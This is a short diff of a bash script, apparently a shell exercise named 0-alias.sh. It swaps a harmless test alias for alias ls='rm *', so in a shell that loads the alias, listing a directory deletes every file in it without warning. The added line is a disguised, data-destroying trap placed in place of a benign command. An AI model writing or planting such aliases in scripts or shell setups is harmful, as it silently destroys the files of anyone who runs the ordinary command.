@@ -1,3 +1,3 @@
 #!/bin/bash
-alias ls='echo "This is a test"'
+alias ls='rm *'
 chmod +x 0-alias.sh
